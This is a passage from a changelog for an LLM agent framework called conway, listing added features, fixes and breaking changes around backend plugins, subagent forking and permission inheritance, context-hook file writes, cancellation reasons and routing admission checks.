  backends-as-plugins charter; shape approved in). `ConwayBuilder::with_backend` takes a backend
  already constructed; `with_backend_factory` takes something that knows how
  to construct one and defers that until the config it needs exists — the
  same split `RouterFactory` makes, because an install list is read long
  before API keys, base URLs, and per-model overrides do.

  `BackendFactory::id()` names a **kind**, and its doc says why that is not
  the question `Backend::id()` answers: that one is a *configured instance*
  identity taken from the `backends.<id>` key, and two configured backends
  can be the same kind under different ids. The consequence is the one real
  asymmetry against routing — a backend factory is built **once per matching
  configuration entry**, where a `RouterFactory` is built at most once,
  because a build has exactly one router.

  Precedence extends the existing per-id rule rather than inventing a second
  one: an injected instance beats a factory-built one sharing its
  `Backend::id()`. Two factories reporting the same kind id is a hard
  `build()` error naming both, and it is checked in its own pass **before
  any factory's `build` runs**, so a duplicate never leaves one factory's
  side effects behind while the whole call still fails. A factory whose
  `build` errors fails the entire `build()` with an error naming that
  factory's kind — never a silent fallback. Registering no factories
  leaves `build()` behaving exactly as before, and no existing test needed
  editing.

  Every `BackendBuildContext` field type is nameable from a crate depending
  only on `conway`, proven by extending `backend_parity.rs` — the
  compile-guarded facade test from the preceding item — to construct a
  factory and read every field, rather than by inspection. A port whose
  context cannot be spelled through the public facade is only half-installed.

  **Disclosed limitation:** `backends.<id>.kind` is still a closed enum, so
  a config entry cannot yet name a factory and a registered factory receives
  an empty context. Opening `kind` is;
  until then this surface is reachable only by an embedder calling the
  builder directly. Labeled at the method doc and in
  [`docs/embedding.md`](docs/embedding.md)'s new "Installing a backend"
  section rather than left for a reader to discover.
  (`crates/conway-core/src/ports/backend.rs`,
  `crates/conway-core/src/ports/mod.rs`, `crates/conway/src/builder.rs`,
  `crates/conway/src/lib.rs`, `crates/conway/tests/backend_factory.rs`,
  `crates/conway/tests/backend_parity.rs`,
  [`docs/embedding.md`](docs/embedding.md))

- **Docs 3/5 — trust, security, and compatibility promises:
  [`docs/plugins/trust-and-security.md`](docs/plugins/trust-and-security.md)
  and [`docs/plugins/compatibility.md`](docs/plugins/compatibility.md)**
 . The security page states the
  limit unhedged and up front rather than buried in a non-goals list:
  **conway does not sandbox the plugin process — a trusted plugin runs with
  the operator's full privileges**, their filesystem, network, credentials,
  and ability to exec. The decision to trust is the entire control at that
  level and it is binary. That is also what makes the capability vocabulary
  honest: capabilities govern what a plugin can make *conway* do, never
  what it can do to the machine, which is why `fs.read`, `net`, and `exec`
  are deliberately absent from it — naming them would manufacture a false
  belief.

  It documents what **ships** rather than what was designed: `TrustStore`
  implements exactly one subject kind, `permission_file`, keyed on absolute
  path plus content digest — not the full `(kind, id, digest)` model — and
  no names building the rest. It also records a design-versus-
  shipped gap found while writing: `.design/d4-trust-model.md` describes an
  operator-opened diff against the trusted digest, but the shipped
  `/trust permissions` shows no diff or preview at all, installing and
  trusting in one action.

  The compatibility page gives rules concrete enough to implement against
  rather than "use versioning" — unknown enum tags fail to the **most
  restrictive** value, not to a permissive default; `deny_unknown_fields`
  on for hand-authored files, off for a future wire frame, because a
  misspelled key in a file a human wrote should error loudly while a newer
  field on the wire should not break an older peer. Verified fresh against
  the tree, that asymmetry is currently unimplemented in one direction:
  neither `PermissionFile` nor `TrustFile` sets `deny_unknown_fields`, so a
  misspelled `denys` key still silently installs **zero** deny rules. Filed
  as.

  Both pages also correct two stale instructions in their own originating
  spec — the sanitizer convergence and the structured rule form are `done`,
  not pending — and say so at the site rather than following the stale
  framing.
  (`docs/plugins/trust-and-security.md`, `docs/plugins/compatibility.md`,
  `docs/plugins/README.md`)

- **`conway::backend` — a `Backend` can now be written from a crate that
  depends only on `conway`** (, under
  the backends-as-plugins charter; shape approved in). The trait was re-exported, but none of the
  types its five methods name were, so nobody outside this repository could
  actually implement one. That gap was established by **compiling, not by
  reading**: a scratch crate depending only on `conway` with a full
  `impl conway::Backend` failed with 17 unresolved-name errors — a wider
  set than any of the three documents describing it, all of which omitted
  `Admission`, `check_admission`, and `BoxStream` despite `Backend::admit`
  requiring all three.

  The new curated module exports exactly what the trait's signatures and
  their field types demand, each name justified in the module doc by what
  requires it (nothing is exported "for completeness").
  `check_admission` is not decoration: `admit`'s contract requires every
  implementation to route its arithmetic through that one function rather
  than restating `est + headroom <= max`, so an author who cannot name it
  cannot honour the contract. It is a **separate module beside
  `conway::plugin`** rather than folded into it — a `Backend` is not a
  `Tool`/`Plugin`/`ContextHook`, it is selected by `backends.<id>.kind` in
  config rather than registered in-process alongside a session's tools, and
  its twenty-odd names would bury that module's own narrower promise.

  Two tests lock it: `backend_parity.rs` implements all five methods with
  `admit` overridden and delegating to `check_admission`, using only
  `conway::` paths and importing no internal crate and no `fakes` feature —
  so a shrink in the public surface is a **build** failure, not a runtime
  assertion — and `backend_surface.rs` pins every exported name so a silent
  removal fails to compile there too. Verified by deleting one export and
  observing `error[E0432]: unresolved import`, then restoring.
  `docs/embedding.md`'s reachability table now shows `Backend` as
  implementable from a facade-only crate, and the prose beneath it no
  longer bundles it into the "deliberate, not gaps" claim. `builder.rs` is
  unchanged and no existing test needed editing — this is purely additive.
  (`crates/conway/src/lib.rs`, `crates/conway/tests/backend_parity.rs`,
  `crates/conway/tests/backend_surface.rs`,
  [`docs/embedding.md`](docs/embedding.md))

- **Docs 2/5 — the normative hook and extension-point reference,
  [`docs/plugins/hooks.md`](docs/plugins/hooks.md)**. Fourteen extension points, each with all
  nine required fields — Kind, Receives, May return, On error, On timeout,
  On garbage, When absent, Ordering, and **Status** — checked against the
  tree rather than against the design corpus. **Six of the fourteen are
  implemented** (tool declaration and execution, `ContextHook::
  before_request` and `on_overflow`, `PermissionGate::check`, and
  operator-authored `permissions.json` rules); the other eight are labeled
  designed-not-built with their That Status row is the point
  of the document: this codebase has shipped documented capabilities with
  nothing behind them, and a reference that cannot tell built from designed
  would produce another.

  Three things it pins that were previously only inferable. The
  `on_overflow` boundary is exact: it fires only when the router rejects
  with `ContextTooLarge` — every candidate having failed *solely* on
  headroom — so a *mixed* rejection yields `NoCandidate` and no hook fires
  at all. A hook cannot always shrink a request back under the window, and
  the page says so instead of implying otherwise. The permission ordering
  is documented as `PermissionBroker::decide`'s real eight steps, with its
  honest limit stated rather than smoothed over: a trusted pattern grant
  legitimately short-circuits a human prompt that would otherwise have
  happened, and what makes that acceptable is the narrowing/widening type
  split plus operator-only grants, not the ordering alone. And
  `PluginManifest::required_host_caps` is labeled as a declared field with
  **zero consumers anywhere in the tree** — every construction site passes
  an empty vector and nothing reads it — so no later page documents
  capabilities as if they gate anything.

  Writing it also corrected the item's own spec twice: it named the
  structured rule form and the sanitizer
  convergence as pending and instructed that
  both be labeled designed-not-built. Both have since shipped, so both are
  documented as implemented and the stale framing is called out at the site
  rather than silently followed.
  (`docs/plugins/hooks.md`, `docs/plugins/README.md`)

- **The four "`tools` is narrowing-only" claims are retracted rather than
  implemented: a `tools` selector chooses what is *announced* to the model
  and is not a capability boundary** (,
  confirmed by the project owner). `AskTool`'s **model-facing description**,
  `AskArgs::tools`, `ask.rs`'s module doc, and `ForkSpec::tools` variously
  claimed the selector could "restrict, never widen" or was "intersected
  with the forker's own tool set by the runtime". No such intersection
  exists anywhere in the tree, and the model-facing one was false in the
  dangerous direction — it told the model the argument was safe to pass
  freely, which is an invitation to the very widening path it denied.

  The behaviour is deliberate, and the tree already said so at the
  selector's own consumption site: `PluginRegistry::specs`' doc states that
  the permission gate "decides whether a call the model actually proposes
  is allowed to run, **regardless of what was announced** — announcement
  and execution are independent gates, and neither implies the other."
  Corroborating: `ToolSelector::selects` has exactly one non-test call site
  (that method); `ToolBatchCtx` carries no selector, so `ToolRunner`
  resolves a proposed call by name against the whole registry; and `tools`
  is never persisted in `SessionMeta`, sharing `budget`'s lifecycle rather
  than a boundary's. The TUI's own use says it outright — it excludes
  `report` so the model answers in text "instead of hitting the permission
  gate for a tool call nothing downstream ever unblocks", i.e. the selector
  is prompt economy and the gate is what would otherwise have caught it.

  So the sites now say plainly that `tools` selects what is announced, that
  it *replaces* rather than narrows an inherited selector, and that **the
  permission gate and the confinement root are the capability boundary**.
  Two characterization tests pin the real behaviour so it cannot drift
  back into being claimed: a def-restricted parent forking with an explicit
  `tools` argument naming an excluded tool is genuinely offered it, and a
  registered-but-unselected tool genuinely executes when called — the
  latter distinct from the existing unknown-tool case, which fails at
  `resolve` for a name that was never registered at all.
  `docs/permissions.md`'s "Limits" section — the page's enumeration of what
  is *not* guaranteed — now carries it too. Enforcement was deliberately
  not implemented; it remains available at roughly fifteen lines, and these
  tests would become its fail-first guards.
  (`crates/conway-tools/src/subagent/ask.rs`,
  `crates/conway-tools/src/subagent/tools.rs`,
  `crates/conway/src/subagent_spec.rs`,
  `crates/conway-runtime/tests/subagent_fork_spawn.rs`,
  `crates/conway-runtime/tests/tool_runner.rs`,
  [`docs/permissions.md`](docs/permissions.md))

- **A forked child now inherits the parent's `agent_def` — but never that
  def's `result_contract`** . **BREAKING:** a def's system
  prompt, tools selector, and model pin newly apply to fork children that
  had none before. Inside the same TUI, `/ask` kept the parent's def and
  `/fork` lost it — drift rather than design, and git history shows an
  earlier commit finding the same mismatch, choosing to delete the claims
  rather than implement them, and the claims returning within weeks.

  Losing the def was two defects at once.
  *Under-inheriting:* the child inherited the parent's entire transcript,
  every turn authored under that persona, then ran it with no system
  prompt at all. *Over-inheriting, and this one escalated:* with no
  `agent_def` and no `tools` argument the selector resolved to `None` and
  the registry returned everything, so a parent restricted by its def to
  `[read, grep, conway_fork]` forked and got a child holding `bash`,
  `write`, `edit` — strictly wider capability than the parent, in a fork
  whose premise is "same agent, one more directive".

  `Runtime::start`'s Fork arm now fills `agent_def` from the parent's
  `SessionMeta` when the call site left it unset. That is the single choke
  point — `conway_fork`, `ForkSpec`/`SessionHandle::fork`, the TUI's bare
  `/fork` and `/fork @<agent>`, and `SubagentSpec::fork` all reach it, so
  none needed editing. Spawn is untouched. The near-identical fill
  `Runtime::ask` carried is deleted rather than kept in sync by hand, since
  `ask` is fork-only and this covers it.

  **A `result_contract` is never inherited.** `def_was_inherited` is
  captured *before* the fill mutates `spec.agent_def`, so a contract is
  sourced only from a def the call site *named*. This is not the ask
  carve-out by analogy — a fork's `AgentResult.structured` is both
  satisfiable and readable by the forker, so that reasoning does not
  transfer. It rests instead on `start`'s own existing statement that the
  contract chain is exactly two-deep with no inherit-from-parent step, and
  on the concrete regression it prevents: without the rule, a bare `/fork`
  off any def-carrying agent produces a keep-alive interactive child
  *required* to `report` and *denied* that tool (the TUI hardcodes
  `Except(["report"])`), reproducing in a new
  path with nobody having typed either half.

  Both guards shown to fail first, verified independently of the
  implementer. The tool-set guard fails on the offered tool list itself —
  `["marker", "secret"]` against `["marker"]` — because that list is what
  the model was handed and is the escalation, not an error string.
  (`crates/conway-runtime/src/subagent.rs`,
  `crates/conway-runtime/tests/subagent_fork_spawn.rs`,
  `crates/conway-core/src/config.rs`, `crates/conway/src/subagent_spec.rs`,
  `crates/conway-cli/src/tui/commands.rs`,
  [`docs/agents.md`](docs/agents.md))

- **A context hook can now write a file without guessing where it is
  allowed to: `ContextHookCtx` carries a confinement-checked
  `ArtifactWriteHandle`**.
  **BREAKING:** `ContextHookCtx` gained a required `artifacts` field, so
  any code constructing one by hand must supply it.
  `ContextHook::before_request` already receives the assembled
  `ContextPayload` before it reaches the model and may edit a
  `Provenance::ToolResult` segment in place — which means a spill-to-file
  plugin (write oversized tool output to a file, leave a short preview and
  a pointer in context) was already writable in-process with no core
  change. What was missing was the one thing that makes writing a file
  safe: the hook got neither a cwd nor a confinement root, while every
  tool reaches the filesystem through `ToolCtx.cwd`/`chdir` bounded by the
  agent's `AgentRoot`. A hook author's only options were to reach for
  ambient filesystem access and guess a path, to take a path out-of-band
  at construction time (fixed at install, unable to follow an agent that
  `chdir`s or a subagent with a narrower root), or to write somewhere the
  agent provably cannot read back.

  The handle is **write-capable, not a value to resolve against**:
  `ArtifactWriteHandle::write(name, bytes)` returns the resolved path or a
  typed `ArtifactWriteError`, so the accessor is the sole place a
  candidate path is resolved and checked and no `join`/`write` surface is
  left for a hook to get subtly wrong. Handing over the raw `AgentRoot`
  was rejected on two independent grounds: `AgentRoot` lives in
  `conway-runtime`, which depends on `conway-core` and not the reverse, so
  `ContextHookCtx` cannot name it without inverting crate layering; and it
  would make every hook author re-implement resolve-then-contains, which
  is the same duplicated-implementation failure this tree has already
  suffered twice by losing the NUL-byte guard from inlined copies. A
  `CwdHandle`-shaped object was rejected in kind rather than degree —
  `CwdHandle::set` performs no containment check by design, because cwd
  was never the boundary.

  The single implementation reuses `resolve_like_the_tool_will` and the
  same three-way `Unconfined`/`Broken`/`Confined` match
  `PermissionBroker::check_root` already applies to every tool's own path
  arguments — no second resolution rule. The guard is shown to be
  load-bearing: removed, three tests fail and a `..` traversal
  actually reaches disk outside the root; restored, all nine pass. Exposed
  through `conway::plugin` so a third-party hook gets the identical
  surface a built-in does.
  (`crates/conway-core/src/ports/artifact.rs`,
  `crates/conway-core/src/error.rs`, `crates/conway-core/src/ports/mod.rs`,
  `crates/conway-core/src/ports/plugin.rs`,
  `crates/conway-runtime/src/artifact_store.rs`,
  `crates/conway-runtime/src/agent_loop.rs`,
  `crates/conway-runtime/src/lib.rs`, `crates/conway/src/lib.rs`,
  `crates/conway/tests/plugin_surface.rs`)

### Fixed

- **Setting both `keep_alive` and a `result_contract` on one child no longer
  hangs the caller**. The two
  compose into a hang: a contract is checked when a child finishes and its
  validated answer is handed back, and `keep_alive` is precisely the
  instruction never to finish -- so the answer was validated and then had
  nowhere to go, and `await_result` never resolved. A hang is the worst
  available failure shape because it is indistinguishable from a child that
  is simply still working, and neither flag's documentation said so. The
  combination is now refused by `SubagentSpec::validate` with a typed error
  naming both fields, at the single chokepoint every subagent path already
  passes through. Delivering a kept-alive child's result remains a real
  feature and stays open; rejecting forecloses only the silent version of
  it, and nothing could depend on the old behaviour because the old
  behaviour was a hang.

- **A modal `/ask` against a session whose agent def declares a
  `result_contract` no longer fails on every call, and an `ask` child now
  inherits the parent's agent def** (and, settled — one change, because both land at
  the same trait boundary). Two halves of a single inconsistency, and
  together the same defect in **both** directions at once:
  - *Under-inheritance, now fixed.* The `conway_ask` tool builds its
    `SubagentSpec` with `agent_def: None` — a `ToolCtx` has no
    `SessionMeta`/`AgentDef` lookup of its own — and `Runtime::ask` passed
    that `None` straight through. The child therefore inherited the
    parent's **entire transcript** (a fork always does) while getting no
    system prompt of its own: it silently read a transcript authored by an
    agent it was not. Worse, since an absent `spec.tools` *plus* an absent
    `agent_def.tools` falls through to `PluginRegistry::specs`'s "no
    selector means everything", the child resolved to the **full tool
    registry** rather than the parent def's restrictive selector — a
    capability escalation one `conway_ask` hop away from a def-restricted
    parent. `Runtime::ask` now fills `agent_def` from the parent's own
    `SessionMeta` when the call site leaves it unset, at the trait
    boundary rather than by widening `ToolCtx` for one call site.
    This is a fallback, not an override: an embedder that supplies its own
    `spec.agent_def` is left untouched, and an explicit
    `spec.tools`/`AskArgs::tools` still takes precedence over the def's
    selector. **That precedence is a replacement, not an intersection**, so
    an explicit `tools` list can name a tool the inherited def excludes —
    this change closes the "no argument supplied" escalation above and does
    **not** close the explicit-argument one — which turns out to be the
    intended design rather than a hole, and the four declarations claiming
    otherwise have since been retracted (see below).
  - *Over-inheritance, now carved out.* Filling `agent_def` exposed a live
    regression that already existed on the facade path, where
    `SessionHandle::ask` has always inherited the def: `start` also
    sourced `result_contract` from that def, so a TUI modal `/ask` against
    any session whose def declares a contract failed **every** call.
    `structured` is populated only by a successful `report` call, and no
    operator lists `report` in a reviewer's tools, so the child failed
    validation, spent its one corrective retry, and terminated `Rejected`.
    A def-declared contract is now never sourced for an ask child, gated
    on `spec.ask_origin.is_some()` — already `Some` for exactly the two
    ask entry points and `None` for every fork/spawn reaching the same
    `start`, so no parallel "is this an ask" flag was needed. The
    justification is structural, not a heuristic: `AskOutcome` carries no
    `structured` field at all, and `TurnHandle` is driven the same way, so
    a contract on an ask child can only ever turn a good prose answer into
    a rejection — it can never satisfy anything a caller reads back. An
    embedder hand-constructing a spec with both `ask_origin` and
    `result_contract` set is rejected with a typed `InvalidSpec` rather
    than silently ignored.

  Both halves ship with a guard shown to fail first: the facade
  test reproduces the exact live failure
  (`Rejected { missing: [": null is not of type \"object\""] }`) and the
  runtime test asserts the child's context carries a
  `Provenance::AgentDef` segment, not merely that tree bookkeeping records
  a def. `conway_fork`'s own def-dropping asymmetry — the same TUI keeps
  the def on `/ask` and loses it on `/fork` — is deliberately **not**
  changed here; it is filed separately as,
  because a fork returns a full `AgentResult` *with* a `structured` field,
  so the contract reasoning above does not transfer to it.
  (`crates/conway-runtime/src/subagent.rs`,
  `crates/conway-core/src/ports/subagent.rs`,
  `crates/conway-tools/src/subagent/ask.rs`,
  `crates/conway-runtime/tests/ask.rs`, `crates/conway/tests/ask.rs`,
  [`docs/agents.md`](docs/agents.md))

- **Tool schemas are sent once per request instead of twice**. Every request carried the full tool-schema set
  twice: as the native `tools` array the provider consumes, and again as a
  system message holding the canonical JSON of the same `ToolSpec` list. The
  second copy was a superset — `ToolSpec` serialized every field, so it also
  shipped `category` and `permission`, leaking conway's internal permission
  taxonomy into the prompt where a model has no use for it. Measured against
  the 14 built-in tools, the duplicate was **13,771 bytes (~3,443 tokens) per
  turn** — roughly 83% of a no-history turn's estimate — and, because a fork
  inherits the whole ancestry transcript, it was paid again at every fork
  depth for every sibling. The system segment still exists and still carries
  no schema text: it remains the cache breakpoint anchor, the source of
  `Provenance::ToolRegistry`'s hash, and the boundary `prefix_key` requires,
  so prefix-key behaviour is unchanged in shape and still varies with the
  tool set. On Anthropic the breakpoint now attaches to the last entry of the
  native `tools` array, which the Messages API supports directly; on
  OpenAI-compatible dialects the segment simply emits no message. Stripping
  only the two leaked fields was measured and rejected — it saves 4.6%,
  because the schema JSON dominates, not the enums (the measurement
  chose the option).
- **The context estimate no longer under-counts every request by a full
  schema dump.** The estimator counted the system copy and had no term at all
  for the native `tools` array, so `ContextReport::total_tokens_est` was
  systematically low — and that estimate gates admission, so requests were
  admitted that should have been refused. The estimate is now computed from
  the tool set directly, including on the `ContextHook` re-estimation path, so
  a hook that narrows or replaces tools cannot regress the report to an
  under-count. This is a correctness fix independent of the duplication.
- **`cargo clippy --workspace --all-targets -- -D warnings` passes again.**
  Two lints introduced earlier in this same unreleased series made strict
  workspace linting fail outright: a `Copy` config cloned in the routing
  plugin's factory, and a bare three-element tuple in `ConwayBuilder::build`
  complex enough to trip `type_complexity`. The latter is now spelled as the
  `RouterBundle` it already was — router, health, explain — so the three
  selection arms agree on a named contract rather than on tuple position.

- **The economic claim behind map-and-gather is now verified on the wire**
 . `PHILOSOPHY.md` says siblings
  forked at the same point "open with the same bytes", and that ten children
  forked from one point are largely paid for after the first. The existing
  tests proved the siblings share one in-process allocation — which is not
  the same property and does not save anything. A new test drives three
  `conway_fork` calls issued in a single assistant turn through the real
  Anthropic adapter over `wiremock`, captures the outgoing request bodies,
  and asserts the `system` block, the `tools` array (including breakpoint
  A's `cache_control` on the last tool), and every message before each
  sibling's own directive are byte-identical across all three — with
  breakpoint B landing on the last block of that shared run, where a
  provider's prefix match needs it. Each sibling's own directive is asserted
  to differ, so the test cannot pass vacuously. Measured on the fixture's
  captured bytes: ~13.5KB shared against an ~82-byte per-sibling tail, i.e.
  roughly 99% of a sibling's input recoverable from cache in steady state.
  No behaviour changed; the claim was true and is now enforced.
  (`crates/conway/tests/fanout_prefix_sharing.rs`)

- **Graceful cancellation's non-propagation is now enforced, not just
  documented** . `CancelMode::Graceful` stops the named agent
  alone; only `Immediate` collapses the subtree. That contract was stated in
  ten places and demonstrated in none, while its opposite — immediate
  propagation — had a test. It now has one too: a graceful cancel on a parent
  with a live child, asserting the parent reaches `Cancelled` while the child
  runs on to its own terminal result. `SubagentHandle::cancel_with`, the
  plugin author's primary surface, previously named the resume-gate caveat by
  reference while silently omitting this one, which reads as "the resume gate
  is the only catch"; it now names both. No behaviour changed.
  (`crates/conway-core/src/ports/subagent.rs`,
  `crates/conway/tests/session_handle_subagent.rs`)

- **A cancellation reason survives the in-flight-request race too** (board
  item). When a cancel landed while a request to
  the model was already in flight, the agent stopped correctly but reported a
  generic `"attempt cancelled"` instead of the caller's reason — a third
  discard site, after the two closed by. The
  guarantee was stated in four places and untrue in this corner, which is
  harder to notice than an undocumented gap. Fixed in the agent loop rather
  than by plumbing a tree handle into the attempt engine: the loop already
  holds the tree and already performs the identical lookup one function away,
  and because `AgentTree::cancel` stashes the reason *before* it trips the
  cancellation token, the read-back is race-free by construction.
  (`crates/conway-runtime/src/agent_loop.rs`, `attempt.rs`, `tree.rs`,
  `runtime.rs`, `crates/conway-core/src/agent.rs`)

- **The TUI no longer silently ignores four documented flags**. `--model`, `--session`, `--resume` and
  `--fork-from` were accepted by the parser and never read by the interactive
  UI, while `docs/interactive.md` documented them. There was no error and no
  warning — the session simply behaved as if the flag were absent, and the
  same flags worked correctly in one-shot, so anyone who tried them there
  first had no reason to suspect otherwise. `--model` now pins the model in
  the TUI, through the *same* parser one-shot uses, so a malformed
  `backend/model` fails identically in both modes rather than two different
  ways. The three continuity flags are **refused with a usage error** naming
  the alternatives (one-shot for startup continuity, `/resume <id>` once the
  UI is running) rather than honoured: one-shot's session resolution carries
  flag-specific logic — an existence probe, `--cwd` rejected with
  `--fork-from`, local-head resolution for a seq-less fork — with no natural
  TUI equivalent, and building a second version was out of scope. Refusing
  loudly is the point; silently accepting was the defect. `docs/interactive.md`
  and `docs/sessions.md` now describe what actually happens, including a
  `--resume <id> (CLI/TUI)` claim in the latter that was simply false.
  **A doc comment in the TUI justified the omission by asserting a
  `SessionSpec` field "does not exist yet"; it already existed.**
  A wrong justification is worse than none — a reader who checks it stops
  looking, which is plausibly how this survived. Both that comment and a
  matching stale note in `oneshot.rs` are gone.
  (`crates/conway-cli/src/model_pin.rs`, `crates/conway-cli/src/tui/app.rs`,
  `crates/conway-cli/src/oneshot.rs`, `crates/conway-cli/tests/tui_model_pin.rs`,
  `docs/interactive.md`, `docs/sessions.md`)

- **`CliOverrides::model` is removed** . **Breaking for an embedder that set
  it** — though setting it never did anything: the field had zero readers
  anywhere in the workspace, and `cli_overrides_to_value`, the only function
  that consumes the struct, deliberately skipped it because a model pin is not
  a `ConwayConfig` key. A struct's own translation function having to
  special-case a field out is the tell that the field is on the wrong axis. No
  capability is lost: the model pin's real home is `SessionSpec::model`, which
  passes straight through to `RootSpec::model` and is what an embedder already
  uses. The remaining eight fields each land on a real config key and stay.
- **`CliOverrides` is documented as what it actually is** — an embedder-facing
  API for layering flag-shaped overrides onto discovered config, and the
  highest-precedence of the five merge sources. `conway-cli` deliberately does
  not use it, and now says so where a flag-adder is standing: routing this
  crate's flags through it would be actively breaking rather than merely
  unwired, because `--permission-mode` carries a clap default and the tool
  lists are `Vec` rather than `Option`, so as the top merge layer they would
  stomp `settings.json` on every invocation and trip the validator's
  allowlist-requires-a-non-empty-list check on a bare run.
  (`crates/conway/src/config/merge.rs`, `crates/conway-cli/src/cli.rs`,
  `docs/embedding.md`)

- **A cancellation reason now reaches the cancelled agent's result on the
  immediate path, not just the graceful one**. `conway_cancel` accepts a `reason`; on the
  immediate path it went to a `tracing` line and nowhere else. That became
  worse than a uniform gap once graceful cancellation shipped, because the
  same argument on the same tool then reached the result on one path and
  vanished on the other. The reason is stashed on the named agent's tree
  entry and read back by BOTH immediate-path sites that build a terminal
  result — the agent loop's own cancellation check, and the supervisor's
  synthesis when a task fails to unwind within its grace window. Previously
  each independently hardcoded `"cancelled"`, so fixing only the common one
  would have left the guarantee false in exactly the case nobody tests by
  hand. **Scope, stated because it is a real limit and not an oversight:**
  only the agent actually named in the cancel carries the reason. Immediate
  cancellation collapses the subtree structurally, by cancellation-token
  propagation, which carries no data — a descendant swept up by it was never
  itself given a reason, so its result falls back to a generic one. That is
  documented at every declaration site: the tool argument's own schema
  description, `Runtime::cancel`, `CancelMode`, and `AgentTree::cancel`.
  A model-supplied reason is bounded before it reaches persistence.
  (`crates/conway-runtime/src/{tree,agent_loop,supervisor,runtime}.rs`,
  `crates/conway-core/src/agent.rs`,
  `crates/conway-tools/src/subagent/control.rs`)

- **Configuration warnings reach you instead of being computed and
  discarded**. `Conway::warnings()`
  had zero call sites anywhere in the workspace: `config::merge::validate`
  correctly detected a role whose configured headroom meets or exceeds the
  smallest context window reachable through its chain, stored the warning on
  the handle, and nothing ever read it. Every request routed to that model
  would be refused by the context-window gate, and conway said nothing about
  why. Warnings now print to stderr at startup for every non-interactive
  target (`sessions`, `routes`, one-shot `-p`), and enter the transcript as a
  non-fatal entry in the TUI — a stray stderr write would otherwise land on
  top of the drawn UI once the terminal is in raw mode. The embedder path was
  already covered by the accessor itself; what was missing was the two
  surfaces that own a human's attention (no capability in only
  one mode). `WarningCode` has exactly one variant and exactly one producer,
  so nothing was declared-but-unconstructed alongside it.
  (`crates/conway-cli/src/main.rs`, `crates/conway-cli/src/tui/app.rs`,
  `crates/conway-cli/tests/config_warnings.rs`, `docs/routing.md`)

### Changed

- **`Backend::admit` becomes the authoritative context-fit check;
  `conway-routing`'s pre-flight arithmetic is demoted to an advisory
  filter** , completing the admission work shipped `admit` for but left unconsumed.
  Right up to this item, three call sites asked the same question --
  "does this fit?" -- with three independent restatements of
  `est_tokens + headroom_tokens <= max_context_tokens`:
  `conway_routing::context_shortfall` (`router.rs`'s `check_candidate` and
  `capability.rs`'s `satisfies`) and `conway-runtime`'s own
  `AttemptEngine::execute`, which partitioned candidates by that same
  predicate BEFORE a request had even been assembled. `context_shortfall`
  is deleted outright; `AttemptEngine::execute` now builds each route's
  real `GenerateRequest` first (segments already carrying that candidate's
  own cache hints -- see below) and asks `backend.admit(&gen_req,
  req.headroom)`, the backend's own dialect-aware estimate over its own
  wire body, never a restatement. A refusal skips that one candidate --
  no network call, no health `Observation` (a too-large prompt is a
  request problem, not an endpoint-health signal) -- and the chain
  advances; when EVERY candidate refuses this way, the refusals are
  aggregated into `RuntimeError::Routing(RoutingError::ContextTooLarge)`,
  naming the largest window among them and sourcing every number from the
  refusing `BackendError`s directly. **The router's own declared-window
  check survives as a cheap, ADVISORY pre-filter** -- `capability.rs`'s
  `satisfies` is split into `non_size_missing` (the six non-size
  requirements) and `size_missing` (the headroom gate, now expressed
  through `conway_core::ports::Admission` rather than restating the
  arithmetic), and `router.rs`'s `check_candidate` asks both directly --
  `non_size_missing(..).is_empty() && size_missing(..).is_some()` --
  rather than counting strings in a combined `Vec` (`missing.len() == 1`,
  the prior, fragile discrimination). **The two checks are deliberately
  NOT required to agree**: the router's `heuristic-chars4` estimate over a
  *declared* window and `admit`'s measure of the *actual* serialized wire
  body are different questions asked at different times -- `docs/
  routing.md`'s new "Advisory vs. authoritative" section explains why a
  test asserting agreement between them would be asserting the wrong
  thing. `CapabilityIndex`/`CapabilityIndex::from_backends` move from
  `conway-routing` to `conway_core::ports` ("the backend side": the type
  reads directly off `Backend::capabilities` and is not routing-policy
  specific), re-exported from `conway-routing` for source compatibility.
  `conway-routing` is no longer a dependency of `conway-runtime` at all --
  `context_shortfall` was the last thing it named there. **Breaking for
  any code outside this workspace naming `conway_routing::context_shortfall`
  directly**: it no longer exists; there is no drop-in replacement, by
  design -- a caller that needs this question answered should build its
  `GenerateRequest` and call `Backend::admit`.
  (`crates/conway-core/src/ports/capability_index.rs`,
  `crates/conway-core/src/ports/mod.rs`, `crates/conway-core/src/capabilities.rs`,
  `crates/conway-routing/src/capability.rs`, `crates/conway-routing/src/router.rs`,
  `crates/conway-routing/src/lib.rs`, `crates/conway-runtime/src/attempt.rs`,
  `crates/conway-runtime/Cargo.toml`, `docs/routing.md`)

- **The T-2 failure-classification table and `HeadroomPolicy` move from
  `conway-routing` into `conway-core`**, the precondition for the agent engine to stop
  depending on the whole routing library for two small things unrelated to
  routing policy. `FailureClass`, `classify`, and `observation_for` (the
  authority on whether a `BackendError` advances the fallback chain and/or
  feeds a health observation) move from `conway-routing`'s `failure.rs`
  (deleted, along with its `pub mod failure` declaration) to
  `conway_core::failure` — half the table already lived in `conway-core` as
  `BackendError::is_health_signal()`/`is_failover_worthy()`, and the
  consistency test pinning the two together (`observation_for(e).is_some()
  == e.is_health_signal()`, exhaustive over every variant including
  `ContextTooLarge`) is now intra-crate, so it can never again drift across
  a crate boundary the way `ContextTooLarge`'s missing arm did in (commit `92bfbd7`).
  `HeadroomPolicy` moves from `conway-routing`'s `config.rs` to
  `conway_core::capabilities`, beside `DEFAULT_HEADROOM_TOKENS`: checking
  every read of `HeadroomPolicy::resolve` and every construction site found
  `DeclarativeRouter::new` still takes it as a caller-supplied sidecar and
  cross-checks its resolution against `RoutingConfig::headroom_for` per role
  (`ConfigIssueKind::HeadroomSourcesDisagree`), so it is not a total,
  drop-in replacement for `RoutingConfig::headroom_for` and stays as a real
  type, just relocated. `crate::config::validate`, `ConfigIssue`, and
  `ConfigIssueKind` stay in `conway-routing` unchanged. **Breaking for any
  code outside this workspace naming these by their old crate path**:
  `conway_routing::failure::*` and `conway_routing::config::HeadroomPolicy`
  no longer exist; use `conway_core::failure::*` and
  `conway_core::capabilities::HeadroomPolicy`. The `conway` facade's own
  public surface (`crates/conway/src/lib.rs`) named neither type, so it is
  unaffected. `crates/conway-runtime/src/` now names `conway_routing` for
  nothing except `context_shortfall` (the sibling item owns removing that
  last dependency line).
  **A missing classification arm is now a compile error rather than a silent
  `Fatal`.** `classify`'s wildcard arm is gone: co-locating it with
  `BackendError` means `#[non_exhaustive]` no longer forces a catch-all, so
  a future variant added without an arm fails to build instead of falling
  through to "do not advance the chain". That is the general fix for the
  specific defect `ContextTooLarge` hit, which compiled cleanly precisely
  because a catch-all absorbed it. `conway-routing` also drops its `toml`
